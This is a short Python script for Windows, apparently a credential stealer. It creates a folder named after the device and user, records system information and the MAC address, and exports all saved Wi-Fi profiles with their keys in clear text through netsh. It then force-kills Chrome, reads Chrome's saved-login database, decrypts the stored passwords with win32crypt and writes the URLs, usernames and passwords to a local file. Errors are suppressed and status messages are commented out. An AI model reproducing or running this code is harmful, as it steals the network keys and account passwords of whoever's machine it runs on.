#import pkg_resources.py2_warn
import os,subprocess,platform,uuid

Device_Name= platform.node()+' - '+os.getlogin()

def ADD_DEVICE():
    #print('Adding Device...')
    try:    os.mkdir('F')
    except: pass
    try:    os.mkdir('.\\F\\' + Device_Name)
    except: pass
    #print('Done.\n')
ADD_DEVICE()

WIFIS= subprocess.getoutput('netsh wlan show profiles')
try:    WIFIS= WIFIS[139:]
except: pass

def SysINFO():
    try:
        with open(f'.\\F\\{Device_Name}\\Info','w') as f:
            f.write(f'SI:\n{platform.uname()}\nMac: {hex(uuid.getnode())}\n\nWIFI:\n{WIFIS}')
    except:
        pass
SysINFO()

def WFPS():
    try:
        subprocess.getoutput(f'NETSH WLAN EXPORT PROFILE KEY=CLEAR FOLDER=".\\F\\{Device_Name}"')
    except:
        pass
WFPS()

def CP():
    #print("Chrome Passwords...")
    import sqlite3,win32crypt
    try:
        subprocess.getoutput('taskkill /f /im "chrome.exe"')
        c = sqlite3.connect(os.path.join(os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data'))
        cursor = c.cursor()
        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        except:
            pass#print('CP Error1')
        credential = {}
        y=0
        for url, user_name, pwd, in cursor.fetchall():
            try:
                pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
                credential[url] = (user_name, pwd[1])
            except:
                y+=1
        if len(credential):
            #print('Done.')
            with open(f'.\\F\\{Device_Name}\\CP', 'w') as f:
                for url, credentials in credential.items():
                    if credentials[1]:
                        f.write("\n"+str(url)+"\n"+str(credentials[0].encode('utf-8'))+ " | "+str(credentials[1])+"\n")
        else:
            pass#print('Failed!\n')
    except:
        pass#print('Failed!\n')
CP()
import time
print(time.process_time())
input()